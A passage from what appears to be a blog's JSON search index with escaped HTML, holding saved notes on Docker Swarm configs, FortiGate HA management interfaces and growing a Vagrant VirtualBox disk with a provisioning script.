style=\"color:#f92672\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ID\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;x06uaozphg9kbnf8g4az4mucn\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Version\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Index\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e2723\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;CreatedAt\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2017-11-21T07:49:09.553666064Z\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;UpdatedAt\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2017-11-21T07:49:09.553666064Z\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Spec\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Name\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;proxy\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Labels\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#f92672\"\u003e{}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Data\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;dXNlciB3d3ctZGF0YTsKd29y...ogIgICAgIH0KICAgIH0KfQo=\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"use-a-config\"\u003eUse a Config\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ docker network create --driver overlay front\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ docker service create --name api --network front lucj/api\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ docker service create --name proxy \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --network front \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --config src\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eproxy,target\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/etc/nginx/nginx.conf \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --port 8000:8000 \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  nginx:1.13.6\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"service-update\"\u003eService Update\u003c/h5\u003e\n\u003cp\u003eWhen the content of a configuration needs to be modified, it\u0026rsquo;s a common pattern to create a new config (using \u003ccode\u003edocker config create\u003c/code\u003e), and then to update the service order to remove the access to the previous config, and to add the access to the new one. The service commands are\u003ccode\u003e--config-rm\u003c/code\u003e and \u003ccode\u003e--config-add\u003c/code\u003e.\u003c/p\u003e","tags":["URL","Docker"],"title":"Docker Tips: Using Docker Config"},{"categories":["URL","Fortigate","Firewall"],"contents":" Fortigate Management Interface in HA Mode First you activate the feature config system ha set ha-mgmt-status enable config ha-mgmt-interfaces edit 1 set interface wan2 set gateway 192.168.147.254 next end end Do not forget to set a default gateway. This interface is isolated and requires its own routing.\nThen you assign an individual IP address to every node in the cluster System1\nconfig system interface edit wan2 set ip 10.11.101.101/24 set allowaccess https ping ssh snmp next end System2\nconfig system interface edit wan2 set ip 10.11.101.102/24 set allowaccess https ping ssh snmp next end New since FortiOS 5.6 Starting with FortiOS 5.6, there is a new way to access every machine directly. This method is In-Band and does not require a reserved interface.\nAssign on any interface a management IP-address. This address will not be synchronised in the cluster. System1\nconfig system interface edit mgmt1 set ip 10.11.101.254/24 set management-ip 10.11.101.251/24 set allow access https ping ssh snmp next end System2\nconfig system interface edit mgmt1 set ip 10.11.101.254/24 set management-ip 10.11.101.252/24 set allow access https ping ssh snmp next end Every device can be accessed individually now. The regular routing table applies.\n","date":"September 8, 2020","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200908-dediziertes-management-interface-fur-fortigate-im-ha-betrieb/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.unixfu.ch/dediziertes-management-interface-fur-fortigate-im-ha-betrieb/\" target=\"_blank\" rel=\"noopener\"\u003eFortigate Management Interface in HA Mode\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"first-you-activate-the-feature\"\u003eFirst you activate the feature\u003c/h5\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003econfig system ha\n   set ha-mgmt-status enable\n   config ha-mgmt-interfaces\n      edit 1\n         set interface wan2\n         set gateway 192.168.147.254\n      next\n   end\nend\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eDo not forget to set a default gateway. This interface is isolated and requires its own routing.\u003c/p\u003e\n\u003ch5 id=\"then-you-assign-an-individual-ip-address-to-every-node-in-the-cluster\"\u003eThen you assign an individual IP address to every node in the cluster\u003c/h5\u003e\n\u003cp\u003eSystem1\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003econfig system interface\n   edit wan2\n      set ip 10.11.101.101/24\n      set allowaccess https ping ssh snmp\n   next\nend\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eSystem2\u003c/p\u003e","tags":["URL","Fortigate","Firewall"],"title":"Fortigate Management Interface in HA Mode"},{"categories":["URL","Vagrant"],"contents":" How to automatically resize virtual box disk with vagrant Increasing Disk Space of a Linux-based Vagrant Box on Provisioning Vagrant.configure(2) do |config| config.vm.box = \u0026#34;centos/7\u0026#34; config.disksize.size = \u0026#39;20GB\u0026#39; end $ sudo parted /dev/sda resizepart 2 100% $ sudo lvextend -l +100%FREE /dev/centos/root $ sudo xfs_growfs /dev/centos/root Automate Part Vagrant.configure(2) do |config| common = \u0026lt;\u0026lt;-SCRIPT sudo parted /dev/sda resizepart 2 100% sudo pvresize /dev/sda2 sudo lvextend -l +100%FREE /dev/centos/root sudo xfs_growfs /dev/centos/root SCRIPT config.vm.define \u0026#34;node01\u0026#34; do |node1| node1.vm.hostname = \u0026#34;node01\u0026#34; node1.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.56.121\u0026#34; config.vm.provision :shell, :inline =\u0026gt; common end end vagrant plugin install vagrant-disksize\nVagrantfile # Fail if the vagrant-disksize plugin is not installed unless Vagrant.has_plugin?(\u0026#34;vagrant-disksize\u0026#34;) raise \u0026#39;vagrant-disksize is not installed!\u0026#39; end Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.provider \u0026#34;virtualbox\u0026#34; do |vb| vb.name = \u0026#34;DISKEXTEND\u0026#34; vb.memory = 2048 vb.cpus = 2 end config.vm.define :\u0026#34;DISKEXTEND\u0026#34; do |t| end config.vm.hostname = \u0026#34;DISKEXTEND\u0026#34; config.vm.box = \u0026#34;bento/ubuntu-18.04\u0026#34; # Increase the default disk size of the bento image (64GB) to 96GB config.disksize.size = \u0026#34;96GB\u0026#34; # Run a script on provisioning the box to format the file system config.vm.provision \u0026#34;shell\u0026#34;, path: \u0026#34;disk-extend.sh\u0026#34; end Provisioning Script: disk-extend.sh #!/bin/bash echo \u0026#34;\u0026gt; Installing required tools for file system management\u0026#34; if [ -n \u0026#34;$(command -v yum)\u0026#34; ]; then echo \u0026#34;\u0026gt;\u0026gt; Detected yum-based Linux\u0026#34; sudo yum makecache sudo yum install -y util-linux sudo yum install -y lvm2 sudo yum install -y e2fsprogs fi if [ -n \u0026#34;$(command -v apt-get)\u0026#34; ]; then echo \u0026#34;\u0026gt;\u0026gt; Detected apt-based Linux\u0026#34; sudo apt-get update -y sudo apt-get install -y fdisk sudo apt-get install -y lvm2 sudo apt-get install -y e2fsprogs fi ROOT_DISK_DEVICE=\u0026#34;/dev/sda\u0026#34; ROOT_DISK_DEVICE_PART=\u0026#34;/dev/sda1\u0026#34; LV_PATH=`sudo lvdisplay -c | sed -n 1p | awk -F \u0026#34;:\u0026#34; \u0026#39;{print $1;}\u0026#39;` FS_PATH=`df / | sed -n 2p | awk \u0026#39;{print $1;}\u0026#39;` ROOT_FS_SIZE=`df -h / | sed -n 2p | awk \u0026#39;{print $2;}\u0026#39;` echo \u0026#34;The root file system (/) has a size of $ROOT_FS_SIZE\u0026#34; echo \u0026#34;\u0026gt; Increasing disk size of $ROOT_DISK_DEVICE to available maximum\u0026#34; sudo fdisk $ROOT_DISK_DEVICE \u0026lt;\u0026lt;EOF d n p 1 2048 no w EOF sudo pvresize $ROOT_DISK_DEVICE_PART sudo lvextend -l +100%FREE $LV_PATH sudo resize2fs -p $FS_PATH ROOT_FS_SIZE=`df -h / | sed -n 2p | awk \u0026#39;{print $2;}\u0026#39;` echo \u0026#34;The root file system (/) has a size of $ROOT_FS_SIZE\u0026#34; exit 0 ","date":"August 25, 2020","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200825-how-to-automatically-resize-virtual-box-disk-with-vagrant/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/@kanrangsan/how-to-automatically-resize-virtual-box-disk-with-vagrant-9f0f48aa46b3\" target=\"_blank\" rel=\"noopener\"\u003eHow to automatically resize virtual box disk with vagrant\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://marcbrandner.com/blog/increasing-disk-space-of-a-linux-based-vagrant-box-on-provisioning/\" target=\"_blank\" rel=\"noopener\"\u003eIncreasing Disk Space of a Linux-based Vagrant Box on Provisioning\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ruby\" data-lang=\"ruby\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eVagrant\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003econfigure(\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003econfig\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econfig\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebox \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;centos/7\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econfig\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edisksize\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esize \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;20GB\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo parted /dev/sda resizepart \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e 100%\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo lvextend -l +100%FREE /dev/centos/root\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ sudo xfs_growfs /dev/centos/root\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"automate-part\"\u003eAutomate Part\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ruby\" data-lang=\"ruby\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eVagrant\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003econfigure(\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003econfig\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommon \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026lt;\u0026lt;-SCRIPT\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\u003c/span\u003esudo parted \u003cspan style=\"color:#e6db74\"\u003e/dev/s\u003c/span\u003eda resizepart \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo pvresize \u003cspan style=\"color:#e6db74\"\u003e/dev/s\u003c/span\u003eda2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo lvextend \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003el \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFREE\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/dev/\u003c/span\u003ecentos\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003eroot\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo xfs_growfs \u003cspan style=\"color:#e6db74\"\u003e/dev/\u003c/span\u003ecentos\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003eroot\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eSCRIPT\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econfig\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edefine \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;node01\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003enode1\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enode1\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehostname \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;node01\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enode1\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enetwork \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;private_network\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003eip\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.168.56.121\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econfig\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovision \u003cspan style=\"color:#e6db74\"\u003e:shell\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e:inline\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e common\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003cp\u003e\u003ccode\u003evagrant plugin install vagrant-disksize\u003c/code\u003e\u003c/p\u003e\n\u003ch5 id=\"vagrantfile\"\u003eVagrantfile\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ruby\" data-lang=\"ruby\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fail if the vagrant-disksize plugin is not installed\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eunless\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eVagrant\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehas_plugin?(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;vagrant-disksize\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eraise\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;vagrant-disksize is not installed!\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eVagrant\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003econfigure(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003econfig\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovider \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;virtualbox\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003evb\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vb\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ename \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;DISKEXTEND\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tvb\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ememory \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2048\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tvb\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ecpus \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edefine \u003cspan style=\"color:#e6db74\"\u003e:\u0026#34;DISKEXTEND\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003et\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehostname \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;DISKEXTEND\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebox \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;bento/ubuntu-18.04\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# Increase the default disk size of the bento image (64GB) to 96GB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edisksize\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esize \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;96GB\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# Run a script on provisioning the box to format the file system\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovision \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;shell\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003epath\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;disk-extend.sh\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"provisioning-script-disk-extendsh\"\u003eProvisioning Script: disk-extend.sh\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026gt; Installing required tools for file system management\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e  \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -n \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ecommand -v yum\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026gt;\u0026gt; Detected yum-based 